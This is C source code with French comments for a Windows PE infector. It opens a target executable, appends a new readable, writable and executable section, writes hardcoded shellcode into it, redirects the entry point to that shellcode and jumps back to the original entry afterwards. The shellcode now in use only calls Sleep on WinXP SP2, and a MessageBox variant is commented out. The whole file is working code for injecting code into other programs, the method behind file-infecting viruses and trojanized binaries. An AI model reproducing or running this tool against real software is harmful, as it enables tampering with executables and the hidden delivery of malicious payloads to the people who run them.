#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

#define USAGE "usage : ./%s <file>.\r\n"

long AligneSur(long alignement,long valeur);

int main(int argc , char* argv[])
{
    /* merci à baboon pour la modif du shellcode :) */
	/*
	char shellcode[]=
     "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb"
     "\x77\x1d\x80\x7c"    //***LoadLibraryA(libraryname) IN WinXP sp2***
     "\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb"
     "\xa0\xad\x80\x7c"   //***GetProcAddress(hmodule,functionname) IN sp2***
     "\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x06\x31\xd2\x52\x51"
     "\x51\x52\xff\xd0\xeb\x35\x50\xb8\xa2\xca\x81\x7c\xff\xd0\xe8\xc4\xff"
     "\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"
     "\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"
     "\xff\x2E\x30\x76\x65\x72\x2E\x4e"
     "\xE9"; // notre jump !
*/

char shellcode[] =
// page 608 doc Intel
/*Sleep(5000)*/
//sleep V2 sqns 0
"\x33\xc0"          		// XOR EAX,EAX
"\x66\xb8\x37\x13"     		//MOV AX,1337
"\x50"             			//PUSH EAX   
"\xb8\x42\x24\x80\x7c" 	// mov eax, 7c802442h
"\xff\xd0" 				//far call eax



/*Jmp Previous entry Point*/
//"\xb8\x30\x11\x40\x00"       // mov eax,<START>  
 //"\xff\xe0" // jmp near eax
"\xe9"
;

    long tailleSection = strlen(shellcode) + 0 + (sizeof(DWORD)); //notre dword sur lequel nous allons sauter, le veritable entry point.

        if(!argv[1])
	{
	printf(USAGE, argv[0]);
	return 1;
	}

    PIMAGE_DOS_HEADER infosExecutable;
    PIMAGE_NT_HEADERS infosPE;

	// CreateFile -> http://msdn2.microsoft.com/en-us/library/aa363858.aspx
	/* LPCTSTR lpFileName,
	__in      DWORD dwDesiredAccess,
	__in      DWORD dwShareMode,
	__in_opt  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	__in      DWORD dwCreationDisposition,
	__in      DWORD dwFlagsAndAttributes,
	in_opt  HANDLE hTemplateFile
	*/
	HANDLE executableHandle = CreateFile(argv[1] , 
		GENERIC_READ | GENERIC_WRITE , 
		FILE_SHARE_READ | FILE_SHARE_WRITE ,
		NULL , 
		OPEN_EXISTING ,
		FILE_ATTRIBUTE_NORMAL, 
		NULL) ; 
	// CreateFileMapping http://msdn.microsoft.com/en-us/library/aa366537(VS.85).aspx
        /*
	HANDLE WINAPI CreateFileMapping(
	__in      HANDLE hFile,
	__in_opt  LPSECURITY_ATTRIBUTES lpAttributes,
	__in      DWORD flProtect,
	__in      DWORD dwMaximumSizeHigh,
	__in      DWORD dwMaximumSizeLow,
	__in_opt  LPCTSTR lpName
	);
	*/
	//chris :  surement up la size avec la taille du shell code 
	HANDLE executableMappe = CreateFileMapping(executableHandle , NULL , PAGE_READWRITE , 0  , 0 , NULL) ; 

	/*
	LPVOID WINAPI MapViewOfFile(
	__in  HANDLE hFileMappingObject,
	__in  DWORD dwDesiredAccess,
	__in  DWORD dwFileOffsetHigh,
	__in  DWORD dwFileOffsetLow,
	__in  SIZE_T dwNumberOfBytesToMap
	);
	*/
	
	LPVOID executableEnMemoire = MapViewOfFile(executableMappe , FILE_MAP_ALL_ACCESS , 0 ,  0, 0); 

    if (executableHandle == INVALID_HANDLE_VALUE || executableMappe == INVALID_HANDLE_VALUE || executableEnMemoire == INVALID_HANDLE_VALUE)
	    return 1;

    infosExecutable = (PIMAGE_DOS_HEADER)executableEnMemoire;

    if (infosExecutable->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("[!] Il ne s'agit pas d'un binaire au format PE.\n");
        return 1;
    }

    printf("[~] Ownage du PE en cours.\n");

    infosPE = (PIMAGE_NT_HEADERS)((PUCHAR)infosExecutable + infosExecutable->e_lfanew);

    if(infosPE->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("[-] La signature PE est corrompu.\n");
        return 1;
    }

    PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
    PWORD pointeurNombreDeSection = &infosPE->FileHeader.NumberOfSections;
    PDWORD pointeurSizeOfImage = &infosPE->OptionalHeader.SizeOfImage;
    DWORD sectionAlignment = infosPE->OptionalHeader.SectionAlignment;
    DWORD fileAlignment = infosPE->OptionalHeader.FileAlignment;
    DWORD sauvegardeEntryPoint = infosPE->OptionalHeader.AddressOfEntryPoint;


    PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS));
    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );


    PIMAGE_SECTION_HEADER notreSection = (PIMAGE_SECTION_HEADER)(infosSection);
    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection - (sizeof(IMAGE_SECTION_HEADER))); //On retrouve l'addr de l'entete précédent pour calculerla vsize et voffset.

    (*pointeurNombreDeSection)++;
    (*pointeurSizeOfImage) += tailleSection;

    char* nomSection = ".newsection"; //7char + \0 => tjrs 8chars.

    strcpy((char*)notreSection->Name,nomSection);
    notreSection->Misc.VirtualSize = AligneSur(sectionAlignment,tailleSection);
    notreSection->VirtualAddress = AligneSur(sectionAlignment,(infosSection->VirtualAddress + infosSection->Misc.VirtualSize));
    notreSection->SizeOfRawData = AligneSur(fileAlignment,tailleSection);
    notreSection->PointerToRawData = AligneSur(fileAlignment,(infosSection->SizeOfRawData + infosSection->PointerToRawData));
    notreSection->PointerToRelocations = 0;
    notreSection->PointerToLinenumbers = 0;
    notreSection->NumberOfRelocations = 0;
    notreSection->NumberOfLinenumbers = 0;
    notreSection->Characteristics = IMAGE_SCN_MEM_READ + IMAGE_SCN_MEM_WRITE + IMAGE_SCN_MEM_EXECUTE;

    *ptrEntryPoint = notreSection->VirtualAddress;

    long fakeEP = notreSection->VirtualAddress;
    long pointerToRaw = notreSection->PointerToRawData;
    DWORD decallage = sauvegardeEntryPoint - ( (fakeEP + tailleSection) );
    DWORD taille;
    long differenceDeTaille = (AligneSur(fileAlignment,tailleSection) - tailleSection);

    UnmapViewOfFile(executableEnMemoire);
    CloseHandle(executableHandle);
    CloseHandle(executableMappe);

    HANDLE fp = CreateFile( argv[1] , GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
    SetFilePointer(fp,pointerToRaw,0,FILE_BEGIN); /*0 added*/

    WriteFile(fp,shellcode,(strlen(shellcode) + 0),&taille,NULL);//on écrit notre shellcode.
    WriteFile(fp,&decallage,sizeof(DWORD),&taille,NULL);// notre adresse sur laquel jump !
    printf("&decallage %p \n", &decallage);
	int i;
    for (i =  0; i < differenceDeTaille ; i++)
	{
		WriteFile(fp,"\x90",1,&taille,NULL);
  	}		
	//on complete par des nop pour avoir la meme taille que ce que l'on a mis dans l'entete d'information./*0 added*/
	CloseHandle(fp);
	return 0;
}

long AligneSur(long alignement,long valeur)
{
    if( (valeur%alignement) == 0)
    {
        return valeur;		
    }	
    long quotient = (valeur/alignement);
    return ((quotient + 1) * ( alignement ));
}	
	

